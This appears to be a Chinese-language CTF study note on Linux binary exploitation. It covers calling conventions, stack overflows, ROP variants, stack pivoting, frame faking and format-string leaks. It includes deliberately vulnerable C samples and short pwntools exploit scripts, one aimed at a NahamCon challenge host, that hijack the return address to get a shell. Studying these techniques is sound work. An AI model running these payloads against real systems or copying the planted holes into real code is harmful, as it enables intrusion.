1. 函数**参数的传递顺序和方式**：最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能
2. **栈**的维护方式：主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。清栈过程可由主调函数或被调函数负责完成。
3. 名字修饰(Name-mangling)策略(函数名修饰 Decorated Name 规则：编译器在链接时为区分不同函数，对函数名作不同修饰。若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定



## cdecl

> C调用约定

- **C/C++编译器默认的函数调用约定**。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式
- **参数从右到左入栈**
- **caller负责清除栈中的参数，返回值在EAX**
- 由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)
- cdecl调用方式**支持可变参数**函数(e.g. `printf`)，且调用时即使实参和形参数目不符也不会导致堆栈错误
- 对于**C**函数，cdecl方式的名字修饰约定是**在函数名前添加一个下划线**；对于C++函数，除非特别使用extern "C"，C++函数使用不同的名字修饰方式

> ### 可变参数函数支持条件
>
> 1. 参数自右向左进栈
> 2. 由**主调函数caller负责清除栈中的参数**(参数出栈)
>
> 参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如`printf`函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错
>
> caller将参数压栈，只有caller知道栈中的参数数目和尺寸，因此caller可安全地清栈。而callee永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整
>
> C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态

## stdcall

- Pascal程序缺省调用方式，WinAPI也多采用该调用约定
- 主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由callee清除栈中的参数，返回值在`EAX`
- `stdcall`调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，`stdcall`名称修饰方式是在函数名字前添加下划线，在函数名字后添加`@`和函数参数的大小，如`_functionname@number`



## fastcall

- `stdcall`调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数从右向左入栈
- callee在返回前负责清除栈中的参数，返回值在`EAX`
- 因为并不是所有的参数都有压栈操作，所以比`stdcall`, `cdecl`快些
- 编译器使用两个`@`修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意`fastcall`函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突



## thiscall

- C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数
- 编译器默认使用`thiscall`调用约定以高效传递和存储C++类的非静态成员函数的`this`指针参数
- `thiscall`调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。
- `thiscall`不是C++关键字，故不能使用`thiscall`声明函数，它只能由编译器使用
- 注意，该调用约定特点随编译器不同而不同，g++中`thiscall`与`cdecl`基本相同，只是隐式地将`this`指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在`%ecx`寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数

## naked call

- 对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call
- 该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令
- naked call并非类型修饰符，故该调用约定必须与`__declspec`同时使用

> `__declspec`是微软关键字，其他系统上可能没有

| **调用方式**       | `stdcall(Win32)` | `cdecl` | `fastcall`                       | `thiscall(C++)`           | `naked call` |
| ------------------ | ---------------- | ------- | -------------------------------- | ------------------------- | ------------ |
| **参数压栈顺序**   | 右至左           | 右至左  | 右至左，Arg1在`ecx`，Arg2在`edx` | 右至左，`this`指针在`ecx` | 自定义       |
| **参数位置**       | 栈               | 栈      | 栈 + 寄存器                      | 栈，寄存器`ecx`           | 自定义       |
| **负责清栈的函数** | callee           | caller  | callee                           | callee                    | 自定义       |
| **支持可变参数**   | 否               | 是      | 否                               | 否                        | 自定义       |
| **函数名字格式**   | _name@number     | _name   | @name@number                     |                           | 自定义       |
| **参数表开始标识** | "@@YG"           | "@@YA"  | "@@YI"                           |                           | 自定义       |



- 不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)



```c
// 采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件
#ifdef _cplusplus
extern "C" { // 使用extern "C" 告知caller所在模块：callee是C语言编译的
#endif
    
int func(int para);
    
#ifdef _cplusplus
}
#endif
```

- 这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误



---

# Linux Pwn





---

## libc / ld Versions

> 本节主要记录如何获取题目要求的libc.so ld.so版本

- 首先需要安装docker，使用`sudo systemctl start docker`启动，`docker version`查看版本。

```bash
# 以拉取ubuntu:16.04的libc, ld为例
sudo docker container run -t -i ubuntu:16.04 /bin/bash # 拉取并运行ubuntu:16.04后进入容器内console
ls /lib/x86_64-linux-gnu/ | grep libc # 查看含libc字样的文件  可看到版本
ls /lib/x86_64-linux-gnu/ | grep ld # 查看含ld字样的文件 可看到版本
# NEW a new console
sudo docker container ls # 然后复制 ubuntu:16.04 的 CONTAINER ID
# 复制 ubuntu:16.04 的 /lib/x86_64-linux-gnu/libc-2.23.so 到 /home/kali/libc-2.23.so
sudo docker cp 3198a81a976d:/lib/x86_64-linux-gnu/libc-2.23.so /home/kali/libc-2.23.so 
# 复制 ubuntu:16.04 的 /lib/x86_64-linux-gnu/ld-2.23.so 到 /home/kali/ld-2.23.so
sudo docker cp 3198a81a976d:/lib/x86_64-linux-gnu/ld-2.23.so /home/kali/ld-2.23.so
```





## PLT and GOT

> the key to code sharing and dynamic libraries. 对代码复用、动态库有关键作用. 运行时重定位
>
> https://www.freebuf.com/articles/system/135685.html Linux中的GOT和PLT到底是个啥？

GOT: Global Offset Table, 全局偏移表。存放**函数地址的数据表**

PLT: Procedure Linkage Table, 程序链接表。**额外代码段**表

动态链接所需要的：

- 需要存放外部函数的数据段（GOT）
- 获取数据段存放函数地址的一小段额外代码（PLT）

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_PLT_GOT_very_simple_illustration.jpg)





## Stack Buffer Overflow

> 栈溢出 栈缓冲区溢出（stack buffer overflow, stack buffer overrun）
>
> 函数调用栈基础知识参考链接：
>
> https://www.cnblogs.com/clover-toeic/p/3755401.html C语言函数调用栈(一)
>
> https://www.cnblogs.com/clover-toeic/p/3756668.html C语言函数调用栈(二)  包含x86函数返回值传递方法，暂未收录

- 栈帧是运行时概念，若程序不运行，就不存在栈和栈帧
- 但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用

Stack Overflow Workflow:

1. 寻找危险函数。快速确定程序是否可能有栈溢出，栈溢出位置在哪。常见危险函数
   - input: `gets`, `scanf`, `vscanf`
   - output: `sprintf`
   - string:` strcpy`, `strcat`, `bcopy`
2. 确定填充长度。计算能够操作的地址与预期覆盖的地址之间的距离。通常打开IDA，根据给定的地址计算偏移。
   - 变量索引模式：
     - 相对于栈基址的索引: 通过查看EBP相对偏移获得
     - 相对于栈顶指针的索引: 一般需要调试，之后转换为相对于栈基址的索引
     - 直接地址索引: 相当于直接给定地址
   - 覆盖需求：(目的一般为 直接或间接控制程序执行流程)
     - 覆盖函数返回地址：直接看EBP
     - 覆盖栈上某个变量的内容：需精细计算
     - 覆盖bss段某个变量内容
     - 根据现实执行情况，覆盖特定的变量或地址的内容



32 位和 64 位程序有以下简单的区别

- x86
  - **函数参数**在**函数返回地址**的上方
- x64
  - System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前6个整型或指针参数依次保存在 **RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上
  - 内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常





- 整数寄存器图表：

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/interger_registers.png)











### Theory 栈溢出原理

> https://www.cnblogs.com/rec0rd/p/7646857.html  关于Linux下ASLR与PIE的一些理解
>
> https://www.anquanke.com/post/id/85831 现代栈溢出利用技术基础：ROP

- 程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变
- 这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式
- 栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程

发生栈溢出的基本前提：

1. 程序向栈上写入数据
2. 写入数据的大小没有被良好控制

```bash
gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
-m32 生成32bit程序
-fno-stack-protector 不开启堆栈溢出保护，即不生成 canary
-no-pie 不开启PIE(Position Independent Executable)，避免加载基址被打乱
```

```c
// 简单示例 stack_example.c // gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
// 这一例子属于 ret2text
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

```bash
$ checksec example
[*] '/home/kali/CTF/pwn/example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- IDA中vulnerable函数的栈显示如下：

```assembly
-00000014 s               db 16 dup(?)            ; string(C)
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

```python
# coding=utf8   # 这个脚本执行后效果：可以看到 You Hava already controlled it. 字样，是success函数的输出
from pwn import *
# 构造与程序交互的对象
sh = process('./example')
success_addr = 0x08049172 # 这个是在IDA中分析得到的success函数的地址
# 0x14字节对应字符串s和var_4 # 4个b对应保存的寄存器s # 然后紧跟的就是success函数地址 用于覆盖原本的函数返回地址
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr) # 构造payload 
sh.sendline(payload) # 向程序发送字符串
sh.interactive() # 将代码交互转换为手工交互
```





---

## ROP

> ROP(Return Oriented Programming)   面向返回编程    栈溢出问题
>
> 核心在于利用指令集中的 `ret` 指令，改变了指令流的执行顺序
>
> 参考链接：
>
> https://www.anquanke.com/post/id/85831   【技术分享】现代栈溢出利用技术基础：ROP   
>
> https://zhuanlan.zhihu.com/p/25816426
>
> https://zhuanlan.zhihu.com/p/25892385
>
> https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html
>
> https://xz.aliyun.com/t/3402

- 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)
- 在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程**
- **gadgets**: 以 `ret` 结尾的指令序列，通过这些指令序列，可修改某些地址的内容，以控制程序的执行流程

所需条件：

1. 程序存在溢出，且可以控制返回地址
2. 可以找到满足条件的gadgets以及相应gadgets的地址(若 gadgets 地址不固定，就需要想办法动态获取对应的地址)



Important Cases:

- ROP_bamboofox_ret2syscall: 案例小巧简单，但是payload需要精心构造，多次rop，适合学习rop构造方法，rsp变化过程
- 



### ret2text

> return to .text of the executable program
>
> 栈溢出原理中所举例子属于该类别

- 控制程序执行程序本身的代码段(.text)
- 也可以控制程序执行好几段不相邻的已有代码(gadgets)
- 需要知道对应的返回的代码的位置

> 案例demo_ROP_bamboofox_ret2text见  https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_bamboofox_ret2text , 所使用的脚本：
>
> ```python
> # python3 pwntools # demo_ROP_ret2text
> from pwn import *
> sh = process('./ret2text')
> target = 0x804863a # 这个是 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
> payload = b'A' * (0x6c + 4) + p32(target) # 这里是前面分析的字符串 s 与 return address 之间的偏移量
> sh.sendline(payload)
> sh.interactive()
> ```
>
> 该案例总结：
>
> 1. IDA分析出危险函数(`gets`)
> 2. IDA分析出可以用于getshell的地方(`system("/bin/sh");`)，记录可以 getshell 的地址
> 3. gdb(pwndbg)分析出`gets`函数所用字符串 s 与 return address 之间的偏移量，构造payload，将用于getshell的地址覆盖到 return address
>
> 比赛案例：
>
> - NahamCon 2021 (ctf.nahamcon.com): Ret2basic: 没开canary等保护，找到打开`flag.txt`的函数，覆盖return address就行了，栈分析可以用gdb也可以用IDA(没分析错)。
>
> ```python
> # NahamCon 2021 (ctf.nahamcon.com): Ret2basic # 
> # 0x0000000000401334   call    _gets
> from pwn import *
> context.log_level = 'debug'
> sh = remote('challenge.nahamcon.com', 30413)
> # 这个是前面分析的 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
> target = 0x0000000000401215
> payload = b'A' * (0x70 + 8) + p64(target)  # 这里是前面分析的字符串 s 与 return address 之间的偏移量
> sh.sendline(payload)
> sh.interactive()
> ```



### ret2shellcode

- 控制程序执行shellcode代码（例如sh）
- shellcode: 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell
- 通常，ret2shellcode问题中，shellcode 需要自行填充。这是另外一种典型的利用方法，即此时需要自己填充一些可执行的代码。(ret2text则是利用程序自身的代码)
- 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限



> 案例见demo_ROP_bamboofox_ret2shellcode  https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_bamboofox_ret2shellcode 有一些问题，见writeup



### ret2syscall

- 控制程序执行系统调用(system call)，获取 shell
- Linux 系统调用号：`/usr/include/asm/unistd.h`

> # 系统调用(wikipedia)
>
> 系统调用 system call，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信
>
> 操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间
>
> 库函数：系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核核心态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。

- Linux 系统调用通过 `int 80h` 实现，用系统调用号区分入口函数。操作系统实现系统调用的基本过程：

1. 应用程序调用库函数 API
2. API **将系统调用号存入 EAX**，然后通过中断调用`int 0x80`使系统进入内核态
3. 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）
4. 系统调用完成相应功能，将**返回值存入 EAX**，返回到中断处理函数
5. 中断处理函数返回到 API 中
6. API 将 EAX 返回给应用程序

- 应用程序调用系统调用的过程是：
1. 把系统调用的编号存入 **EAX**
2. 把**函数参数存入其它通用寄存器**
3. 触发 0x80 号中断`int 0x80`

> 案例见 demo_ROP_bamboofox_ret2syscall (https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_bamboofox_ret2syscall)



### ret2libc

> https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html 
>
> https://xz.aliyun.com/t/3402

- 控制函数的执行 libc 中的函数。通常是返回至某个函数的 **PLT** 处或者函数的具体位置 (即函数对应的 **GOT** 表项的内容)
- 一般情况下，会选择执行 `system("/bin/sh")`，故需要知道 system 函数的地址
- r2libc技术是一种缓冲区溢出利用技术，主要用于克服常规缓冲区溢出漏洞利用技术中面临的no stack executable限制(所以后续实验还是需要关闭系统的ASLR，以及堆栈保护)，比如PaX和ExecShield安全策略。该技术主要是通过覆盖栈帧中保存的函数返回地址(eip)，让其定位到libc库中的某个库函数(e.g. system)，而不是直接定位到shellcode。通过在栈中精心构造该库函数的参数，达到类似于执行shellcode的目的

```bash
readelf -S ret2libc # 可以获得段地址，比如bbs段的地址 # 也可在IDA中获得bbs段的地址
```



### Blind ROP (BROP)

> BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是Hacking Blind

- BROP是**没有对应应用程序的源代码或者二进制文件**下，对程序进行攻击，劫持程序的执行流

**攻击条件**

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。

**基本思路**：在BROP中，基本的遵循的思路如下

- 判断栈溢出长度
  - 暴力枚举: 直接从1暴力枚举即可，直到发现程序崩溃
- Stack Reading
  - 获取栈上的数据来泄露canaries，以及ebp和返回地址。
- Blind ROP
  - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。
- Build the exploit
  - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。





### Fancy Stack Overflow

> 花式栈溢出

#### Stack Pivoting

> 直译 栈旋转. 指劫持栈指针
>
> cases: 

劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。通常在以下情况需要使用Stack Pivoting

- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链。比如可以劫持到bbs, heap。
- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域
- 其它漏洞难以利用，需要进行转换。比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

利用 stack pivoting 的要求：

1. 可以控制程序执行流。

2. 可以控制 **sp** 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是

```assembly
pop rsp/esp
# 利用两次leave 在控制rbp后 间接控制rsp
leave ...; leave: mov rsp, rbp, pop rbp; # 第一条 leave 利用栈上内容，覆盖rbp
leave  ; 第二条 leave 把已经被劫持的rbp的值赋值给rsp
```

- `libc_csu_init` 中的 gadgets，通过偏移可以控制 rsp 指针，上面是正常的，下面是偏移的

```assembly
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

更加高级的 fake frame: 

可以控制的内存，一般有：

- bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限
- heap。但是这个需要能泄露堆地址







#### Frame Faking

> 帧伪造 栈帧伪造
>
> Cases:
>
> - GKCTF2021 应急挑战杯 checkin login   对应writeup有详细的劫持过程的分析，分析了一部分重要指令前后rbp rsp的变换

构造一个虚假的栈帧来控制程序的执行流

概括地讲，在之前讲的栈溢出不外乎两种方式

- 控制程序 EIP
- 控制程序 EBP

其最终都是控制程序的执行流。 frame faking 利用的技巧是同时控制 EBP 与 EIP，在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下

```assembly
buffer padding | fake ebp | leave ret addr | ; 利用栈溢出将栈上构造为该格式
```

- 函数的返回地址被覆盖为执行 `leave ret` 的地址，这就表明了函数在正常执行完自己的 `leave ret` 后，还会再次执行一次 `leave ret`
- 其中 `fake ebp` 为构造的栈帧的基地址，需要注意的是这里是一个地址。是想要劫持过去的目的地址。一般构造的假栈帧如下

```assembly
fake ebp #  fake ebp 指向 ebp2, 即它为 ebp2 所在的地址
|
v
ebp2|target function addr|leave ret addr|arg1|arg2 # 右边为高地址
```

- 通常`fake ebp`表示的地址(ebp2)是能够控制的可读的内容

```assembly
; 函数序言      # 函数的入口点与出口点的基本操作
push ebp  # 将ebp压栈
mov ebp, esp #将esp的值赋给ebp
....
; 函数尾声
leave ; mov esp, ebp; pop ebp # 将ebp的值赋给esp, 弹出ebp
ret # pop eip，弹出栈顶元素作为程序下一个执行地址
```

- 基本控制过程：Case: GKCTF2021 应急挑战杯 checkin login 就是这个过程

1. 在有栈溢出的程序执行 leave 时，其分为两个步骤
   - mov esp, ebp ，将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
   - pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。`$ebp = addr_of_rbp2`
2. 执行 ret 指令，会再次执行 leave ret 指令。pop eip,  `$eip = addr_leave_ret`
3. 执行 leave 指令，其分为两个步骤
   - mov esp, ebp; 使 esp 指向 ebp2。`$esp = addr_rbp2`
   - pop ebp; 将 ebp 的值设置为 ebp2 (因为`$esp = addr_rbp2`)，同时 esp 会指向 target function。`$ebp=ebp2, $esp=target_function_addr`, 因为pop后esp+4，所以就指向紧跟在ebp2后的`target_function_addr`
4. 执行 ret 后程序就会执行 target function(因为现在rsp指向了`target_function_addr`)，当其进行函数序言：
   - push ebp，会将 ebp2 值压入栈中，
   - mov ebp, esp，将 ebp 指向当前基地址。`$ebp=$esp=addr_rbp2`

```assembly
ebp    ; 此时的栈结构
|
v
ebp2|leave ret addr|arg1|arg2
```

1. 当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
2. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程

在 fake frame 中，必须得有一块可以写的内存，并且还知道这块内存的地址，这一点与 stack pivoting 相似







---

## Format String Vulnerability

> Format String Vulnerability 格式化字符串漏洞
>
> format string: 程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数
>
> 转换说明 conversion specification: 用于把随后对应的0个或多个函数参数转换为相应的格式输出

- 格式化字符串函数可以接受可变数量的参数，并将**第一个参数作为格式化字符串，根据其来解析之后的参数**。几乎所有的C/C++程序都会利用格式化字符串函数来**输出信息，调试程序，或者处理字符串**。通常在利用时分为三个部分：
  1. 格式化字符串函数
  2. 格式化字符串
  3. (optional)后续参数

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_printf_demo.png)

上面的这个`printf`调用时，栈上的布局从高地址到低地址为：

```python
# High Addr # printf("Color %s, Number %d, Float %4.2f", "red", 123456, 3.14); 调用时的栈
some value             # 某个未知的值
3.14                   # printf 第4个参数
123456                 # printf 第3个参数
addr of "red"          # 字符串 "red" 的地址 # printf 第2个参数
addr of format string: Color %s, Number %d, Float, %4.2f # format string 格式化字符串，printf 第1个参数
# low Addr
```

进入`printf`后，首先获取第一个参数format string，一个一个读取字符，分析逻辑如下：

1. 当前字符不是%，直接输出到相应标准输出
2. 当前字符是%， 继续读取下一个字符：
   1. 如果没有字符，报错
   2. 如果下一个字符是%，输出%
   3. 否则根据相应的字符，获取相应的参数，对其进行解析并输出

那么，当程序为`printf("Color %s, Number %d, Float %4.2f");`，程序继续运行，将栈上格式化字符串上面的三个变量分别解析为：解析其地址对应的字符串，解析其内容对应的整形值，解析其内容对应的浮点值。



### 格式化字符串与相关函数

> https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2

- 格式化字符串基本格式:  `%[parameter][flags][field width][.precision][length]type`

- parameter
  - n\$，获取格式化字符串中的指定参数。n是用这个格式说明符(specifier)显示第几个参数；使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符也须使用parameter。这是POSIX扩展，不属于ISO C。e.g. `printf("%2$d %2$#x; %1$d %1$#x",16,17);// 17 0x11; 16 0x10` `2$`说明使用第2个参数，即17，`1$`说明使用第一个参数即16
- flags:
  - `+`: 总是表示有符号数值的'+'或'-'号，缺省情况是忽略正数的符号。仅适用于数值类型
  - `space`:  使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与'+'同时出现，则空格说明符被忽略
  - `-`: 左对齐。缺省情况是右对齐
  - `#`: 对于'`g`'与'`G`'，不删除尾部0以表示精度。对于'`f`', '`F`', '`e`', '`E`', '`g`', '`G`', 总是输出小数点。对于'`o`', '`x`', '`X`', 在非0数值前分别输出前缀`0`, `0x`, and `0X`表示数制
  - `0`: 如果*width*选项前缀以`0`，则在左侧用`0`填充直至达到宽度要求。e.g.`printf("%2d", 3);// 3`，`printf("%02d", 3)//03`。如果`0`与`-`均出现，则`0`被忽略，即左对齐依然用空格填充
- field width
  - 输出的最小宽度
- precision
  - 输出的最大长度
- length，输出的长度
  - hh，输出一个字节
  - h，输出一个双字节
- type
  - d/i，有符号整数
  - u，无符号整数
  - x/X，16进制unsigned int 。x使用小写字母；X使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。
  - o，8进制unsigned int 。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。
  - s，如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb 函数。
  - c，如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。
  - p， void *型，输出对应变量的值。printf("%p",a)用地址的格式打印变量a的值，printf("%p", &a)打印变量a所在的地址。
  - n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
  - %， '`%`'字面值，不接受任何flags, width。



- 常见格式化字符串**输入**函数：
  - scanf

- 常见格式化字符串**输出**函数

| Function                  | Description                            |
| ------------------------- | -------------------------------------- |
| printf                    | 输出到stdout                           |
| fprintf                   | 输出到指定FILE流                       |
| vprintf                   | 根据参数列表格式化输出到 stdout        |
| vfprintf                  | 根据参数列表格式化输出到指定FILE流     |
| sprintf                   | 输出到字符串                           |
| snprintf                  | 输出指定字节数到字符串                 |
| vsprintf                  | 根据参数列表格式化输出到字符串         |
| vsnprintf                 | 根据参数列表格式化输出指定字节到字符串 |
| setproctitle              | 设置argv                               |
| syslog                    | 输出日志                               |
| err, verr, warn, vwarn... | ...                                    |



### 格式化字符串漏洞利用

1. 使程序崩溃。 %s 对应的参数地址不合法的概率较大，输入若干个 %s ，栈上不可能每个值都对应了合法的地址，总是会有某个地址可以使得程序崩溃
2. 查看进程内容。根据 `%d, %f, %08x`等输出栈上的内容
   1. 泄露栈内存
      - 获取某个变量的值
      - 获取某个变量对应地址的内存
   2. 泄露任意地址内存
      - 利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址
      - 盲打，dump 整个程序，获取有用信息



#### 泄露内存

通常来说：

1. 利用 `%x` 来获取对应栈的内存，但建议使用 `%p`，可以不用考虑位数的区别
2. 利用 `%s` 来获取变量所对应地址的内容，只不过有零截断
3. 利用 `%order$x` 来获取指定参数的值，利用 `%order$s` 来获取指定参数对应地址的内容。order为一数字



```cpp
#include <stdio.h>  // leakmemory.c // gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
int main() {  // 编译时指定了为32bit 格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为参数
    char s[100];  // printf(s); 处: warning: format not a string literal and no format arguments [-Wformat-security]
    int a = 1, b = 0x22222222, c = -1;
    scanf("%s", s);                             // 在这里输入 %08x.%08x.%08x
    printf("%08x.%08x.%08x.%s\n", a, b, c, s);  // Output:  00000001.22222222.ffffffff.%08x.%08x.%08x
    printf(s);
    return 0;
}
```
- 输入为`%08x.%08x.%08x`时的栈，输出：
```assembly
$ gdb leakmemory
> b printf
> r # run
%08x.%08x.%08x      #   scanf("%s", s);   输入 %08x.%08x.%08x 后回车
